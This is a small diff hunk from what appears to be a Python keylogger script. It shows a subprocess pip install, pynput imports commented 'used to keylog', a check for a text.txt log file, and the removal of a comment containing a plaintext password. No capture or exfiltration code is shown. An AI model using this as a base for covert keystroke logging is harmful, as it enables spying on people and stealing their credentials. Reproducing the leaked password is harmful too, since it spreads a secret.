@@ -6,7 +6,6 @@ subprocess.check_call([sys.executable, '-m', 'pip', 'install',
 import pynput #used to keylog
 import os.path #used to check if text.txt exists
 from os import path
-#password is iamastuyvesanthacker123@
 from pynput.keyboard import Key, Listener
 
 
